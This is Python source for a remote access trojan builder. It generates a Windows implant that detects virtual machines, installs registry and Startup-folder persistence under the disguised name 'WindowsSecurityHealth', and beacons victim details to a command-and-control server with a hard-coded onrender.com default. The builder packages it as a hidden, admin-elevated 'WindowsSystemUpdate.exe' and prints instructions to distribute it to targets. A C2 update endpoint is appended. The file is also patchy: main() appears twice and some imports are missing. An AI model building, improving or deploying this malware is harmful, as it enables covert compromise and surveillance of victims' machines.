# Add a version variable
VERSION = "1.0.0"

# Modify the RAT_TEMPLATE to include the version
RAT_TEMPLATE = '''import os, sys, time, platform, socket, uuid, json, traceback
from urllib import request, error as urllib_error
from datetime import datetime

SERVER = "{{SERVER_URL}}"
VICTIM_ID = platform.node() + "-" + str(uuid.getnode())[-8:]
VERSION = "{{VERSION}}"

def log(msg):
    try:
        log_path = os.path.join(os.environ.get("TEMP", "/tmp"), "syslog.txt")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"{timestamp}: {msg}\\n")
    except Exception:
        pass

def http_post(url, data, retries=3):
    for attempt in range(retries):
        try:
            req = request.Request(
                url, 
                data=json.dumps(data).encode('utf-8'), 
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, 
                method="POST"
            )
            with request.urlopen(req, timeout=15) as response:
                return json.loads(response.read().decode('utf-8'))
        except urllib_error.URLError as e:
            log(f"HTTP Error (attempt {attempt+1}): {str(e)}")
            if attempt < retries - 1:
                time.sleep(2 ** attempt)
        except Exception as e:
            log(f"Unexpected error: {str(e)}")
            break
    return None

def check_vm():
    score = 0
    indicators = []
    
    try:
        mac = uuid.getnode()
        mac_hex = format(mac, '012x').lower()
        vm_macs = ["000569", "000c29", "001c42", "005056", "080027", "525400"]
        
        if any(mac_hex.startswith(m) for m in vm_macs):
            score += 2
            indicators.append("VM_MAC")
        
        if platform.system() == "Windows":
            vm_paths = [
                r"C:\\Program Files\\VMware\\VMware Tools",
                r"C:\\Program Files\\Oracle\\VirtualBox Guest Additions",
                r"C:\\Program Files\\Common Files\\VMware",
                r"C:\\Windows\\System32\\drivers\\vmmouse.sys",
                r"C:\\Windows\\System32\\drivers\\vmhgfs.sys"
            ]
            for path in vm_paths:
                if os.path.exists(path):
                    score += 1
                    indicators.append(f"VM_PATH:{os.path.basename(path)}")
                    break
            
            try:
                import subprocess
                tasks = subprocess.check_output(['tasklist'], encoding='utf-8', errors='ignore').lower()
                vm_processes = ['vmtoolsd', 'vmwaretray', 'vmwareuser', 'vboxtray', 'vboxservice']
                for proc in vm_processes:
                    if proc in tasks:
                        score += 1
                        indicators.append(f"VM_PROC:{proc}")
                        break
            except:
                pass
                
    except Exception as e:
        log(f"VM check error: {str(e)}")
    
    is_vm = score >= 2
    return is_vm, score, indicators

def persist():
    try:
        if platform.system() != "Windows":
            return False
        
        import winreg
        
        exe_path = os.path.abspath(sys.argv[0]) if not getattr(sys, "frozen", False) else sys.executable
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, 
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, 
                winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "WindowsSecurityHealth", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            log("Persistence installed: Registry")
        except Exception as e:
            log(f"Registry persist failed: {str(e)}")
        
        try:
            startup_path = os.path.join(
                os.environ.get("APPDATA", ""),
                r"Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                "WindowsSecurityHealth.lnk"
            )
            if not os.path.exists(startup_path):
                import winshell
                winshell.CreateShortcut(
                    Path=startup_path,
                    Target=exe_path,
                    Icon=(exe_path, 0),
                    Description="Windows Security Health Service"
                )
                log("Persistence installed: Startup folder")
        except:
            pass
            
        return True
        
    except Exception as e:
        log(f"Persistence error: {str(e)}")
        return False

def get_system_info():
    pc_name = platform.node()
    ip_address = "0.0.0.0"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        try:
            s.connect(('8.8.8.8', 80))
            ip_address = s.getsockname()[0]
        except:
            pass
        finally:
            s.close()
    except:
        try:
            ip_address = socket.gethostbyname(socket.gethostname())
        except:
            pass
    
    os_info = f"{platform.system()} {platform.release()} {platform.version()}"
    
    return pc_name, ip_address, os_info

def main():
    log("=== RAT Starting ===")
    log(f"Version: {VERSION}")

    persist()
    
    pc_name, ip_address, os_info = get_system_info()
    
    is_vm, vm_score, vm_indicators = check_vm()
    log(f"VM Check: {is_vm} (score: {vm_score})")
    
    reg_data = {
        "victim_id": VICTIM_ID,
        "pc": pc_name,
        "ip": ip_address,
        "os": os_info,
        "is_vm": 1 if is_vm else 0,
        "vm_score": vm_score,
        "activity": "registered"
    }
    
    registered = False
    for attempt in range(5):
        log(f"Registration attempt {attempt+1}")
        if http_post(f"{SERVER}/heartbeat", reg_data):
            registered = True
            log("Registration successful")
            break
        time.sleep(min(2 ** attempt, 30))
    
    if not registered:
        log("Failed to register, continuing anyway")
    
    fail_count = 0
    while True:
        try:
            heartbeat_data = {
                "victim_id": VICTIM_ID,
                "pc": pc_name,
                "ip": ip_address,
                "os": os_info,
                "is_vm": 1 if is_vm else 0,
                "activity": "active",
                "timestamp": datetime.now().isoformat()
            }
            
            response = http_post(f"{SERVER}/heartbeat", heartbeat_data)
            
            if response:
                fail_count = 0
                if isinstance(response, dict) and response.get('command'):
                    log(f"Received command: {response['command']}")
                    # Command execution would go here
            else:
                fail_count += 1
                if fail_count > 10:
                    log("Too many failures, backing off")
                    time.sleep(300)
                    fail_count = 0
            
            time.sleep(30)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            log(f"Main loop error: {str(e)}")
            time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"Fatal error: {str(e)}")
        time.sleep(10)
'''

def check_pyinstaller():
    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], 
                      capture_output=True, check=True)
        return True
    except:
        return False

def fix_url(url):
    url = url.strip()
    for path in ['/dashboard', '/login', '/index', '/api']:
        if path in url: 
            url = url.split(path)[0]
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')

def build(server_url, output_name="WindowsSystemUpdate", version=VERSION):
    print("=" * 60)
    print("   VIRTUALS RAT BUILDER v4.0")
    print("=" * 60)
    
    server = fix_url(server_url)
    print(f"[*] Target C2 Server: {server}")
    
    base_dir = os.path.dirname(os.path.abspath(__file__))
    dist_dir = os.path.join(base_dir, "dist")
    temp_dir = os.path.join(base_dir, "build_temp")
    
    os.makedirs(dist_dir, exist_ok=True)
    os.makedirs(temp_dir, exist_ok=True)
    
    print("[*] Generating RAT source...")
    rat_code = RAT_TEMPLATE.replace("{{SERVER_URL}}", server).replace("{{VERSION}}", version)
    
    rat_file = os.path.join(temp_dir, "rat.py")
    with open(rat_file, "w", encoding="utf-8") as f:
        f.write(rat_code)
    
    print("[*] Building executable with PyInstaller...")
    print("[*] This may take 2-5 minutes...")
    
    build_dir = os.path.join(temp_dir, "build")
    spec_dir = temp_dir
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--uac-admin",
        "--distpath", dist_dir,
        "--workpath", build_dir,
        "--specpath", spec_dir,
        "--name", output_name,
        "--hidden-import", "winreg",
        "--hidden-import", "winshell",
        rat_file
    ]
    
    try:
        result = subprocess.run(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True,
            encoding='utf-8',
            errors='ignore'
        )
        
        if result.returncode != 0:
            print("[-] Build failed!")
            print("[-] Error output:")
            print(result.stderr[-1000:] if result.stderr else "Unknown error")
            return False
        
        exe_path = os.path.join(dist_dir, f"{output_name}.exe")
        if os.path.exists(exe_path):
            size_mb = os.path.getsize(exe_path) / (1024 * 1024)
            print(f"\n[+] BUILD SUCCESSFUL!")
            print(f"[+] Output: {exe_path}")
            print(f"[+] Size: {size_mb:.1f} MB")
            print(f"[+] Server: {server}")
            print(f"[+] Version: {version}")
            print(f"\n[!] Instructions:")
            print(f"    1. Ensure C2 server is running")
            print(f"    2. Distribute {output_name}.exe to targets")
            print(f"    3. Monitor connections at {server}/dashboard")
            return True
        else:
            print("[-] Build completed but executable not found")
            return False
            
    except Exception as e:
        print(f"[-] Build error: {str(e)}")
        return False
        
    finally:
        try:
            shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass

def main():
    parser = argparse.ArgumentParser(description="RAT Builder")
    parser.add_argument("--server", "-s", default="https://virtuals-c2.onrender.com", 
                       help="C2 Server URL")
    parser.add_argument("--name", "-n", default="WindowsSystemUpdate",
                       help="Output executable name")
    parser.add_argument("--version", "-v", default=VERSION,
                       help="Version of the RAT")
    args = parser.parse_args()
    
    if not check_pyinstaller():
        print("[-] PyInstaller not found!")
        print("[-] Install with: pip install pyinstaller")
        input("Press Enter to exit...")
        return
    
    success = build(args.server, args.name, args.version)
    
    if success:
        input("\nPress Enter to exit...")
    else:
        print("\n[!] Build failed. Check errors above.")
        input("Press Enter to exit...")

if __name__ == "__main__":
    main()

# Add a new endpoint to handle updates
@app.route('/api/update', methods=['POST'])
def api_update():
    try:
        data = request.get_json() or {}
        vid = data.get('victim_id')
        update_url = data.get('update_url')
        
        if not vid or not update_url:
            return jsonify({'success': False, 'error': 'Missing parameters'}), 400
        
        with get_db() as conn:
            c = conn.cursor()
            c.execute("UPDATE victims SET update_url = ? WHERE id = ?", (update_url, vid))
            
        return jsonify({'success': True, 'message': 'Update URL set successfully'})
        
    except Exception as e:
        print(f"Update error: {e}")
        return jsonify({'success': False, 'error': 'Server error'}), 500

# Modify the RAT to check for updates
def check_for_updates():
    try:
        response = http_post(f"{SERVER}/api/update", {"victim_id": VICTIM_ID})
        if response and response.get('success'):
            update_url = response.get('update_url')
            if update_url:
                log(f"Update available: {update_url}")
                # Implement download and update logic here
                # Example: download the new executable and replace the current one
    except Exception as e:
        log(f"Update check error: {str(e)}")

# Add update check to the main loop
def main():
    log("=== RAT Starting ===")
    log(f"Version: {VERSION}")

    persist()
    
    pc_name, ip_address, os_info = get_system_info()
    
    is_vm, vm_score, vm_indicators = check_vm()
    log(f"VM Check: {is_vm} (score: {vm_score})")
    
    reg_data = {
        "victim_id": VICTIM_ID,
        "pc": pc_name,
        "ip": ip_address,
        "os": os_info,
        "is_vm": 1 if is_vm else 0,
        "vm_score": vm_score,
        "activity": "registered"
    }
    
    registered = False
    for attempt in range(5):
        log(f"Registration attempt {attempt+1}")
        if http_post(f"{SERVER}/heartbeat", reg_data):
            registered = True
            log("Registration successful")
            break
        time.sleep(min(2 ** attempt, 30))
    
    if not registered:
        log("Failed to register, continuing anyway")
    
    fail_count = 0
    while True:
        try:
            heartbeat_data = {
                "victim_id": VICTIM_ID,
                "pc": pc_name,
                "ip": ip_address,
                "os": os_info,
                "is_vm": 1 if is_vm else 0,
                "activity": "active",
                "timestamp": datetime.now().isoformat()
            }
            
            response = http_post(f"{SERVER}/heartbeat", heartbeat_data)
            
            if response:
                fail_count = 0
                if isinstance(response, dict) and response.get('command'):
                    log(f"Received command: {response['command']}")
                    # Command execution would go here
                check_for_updates()
            else:
                fail_count += 1
                if fail_count > 10:
                    log("Too many failures, backing off")
                    time.sleep(300)
                    fail_count = 0
            
            time.sleep(30)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            log(f"Main loop error: {str(e)}")
            time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"Fatal error: {str(e)}")
        time.sleep(10)